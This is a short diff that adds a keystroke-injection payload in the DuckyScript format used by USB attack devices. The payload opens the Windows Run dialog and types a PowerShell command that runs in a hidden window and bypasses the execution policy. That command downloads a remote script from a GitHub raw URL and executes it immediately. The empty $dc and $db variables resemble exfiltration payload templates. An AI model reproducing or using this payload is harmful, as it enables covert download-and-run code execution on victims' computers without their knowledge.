@@ -1,0 +1,4 @@
+GUI r
+DELAY 500
+STRING powershell -w h -ep bypass $dc='';$db='';irm https://raw.githubusercontent.com/MaxAxoft/demo/main/runner.ps1 | iex
+ENTER
